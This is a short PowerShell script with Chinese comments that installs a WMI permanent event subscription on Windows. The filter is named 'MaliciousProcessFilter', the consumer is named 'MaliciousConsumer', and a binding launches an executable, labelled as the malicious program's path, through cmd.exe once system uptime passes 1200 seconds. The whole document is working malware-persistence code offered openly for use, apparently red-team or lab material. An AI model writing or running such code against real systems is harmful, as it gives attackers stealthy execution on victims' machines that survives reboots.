$maliciousEXE = "C:\Users\Administrator\Desktop\test\hi.exe"  # 将其替换为恶意程序的实际路径

# WMI __EVENTFILTER
$wmiParams = @{
    ErrorAction = 'Stop'
    NameSpace = 'root\subscription'
}

$wmiParams.Class = '__EventFilter'
$wmiParams.Arguments = @{
    Name = 'MaliciousProcessFilter'
    EventNamespace = 'root\CIMV2'
    QueryLanguage = 'WQL'
    # 监听 SystemUptime 属性的变化
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 1200"
}
$filterResult = Set-WmiInstance @wmiParams

# WMI CommandLineEventConsumer
$wmiParams.Class = 'CommandLineEventConsumer'
$wmiParams.Arguments = @{
    Name = 'MaliciousConsumer'
    ExecutablePath = "C:\Windows\System32\cmd.exe"
    CommandLineTemplate = "/c `"$maliciousEXE`""
}
$consumerResult = Set-WmiInstance @wmiParams

#WMI __FILTERTOCONSUMERBINDING
$wmiParams.Class = '__FilterToConsumerBinding'
$wmiParams.Arguments = @{
    Filter = $filterResult
    Consumer = $consumerResult
}

try {
    Set-WmiInstance @wmiParams
    Write-Host "WMI 事件订阅创建成功！"
} catch {
    Write-Host "创建 WMI 事件订阅失败: $($_.Exception.Message)"
}
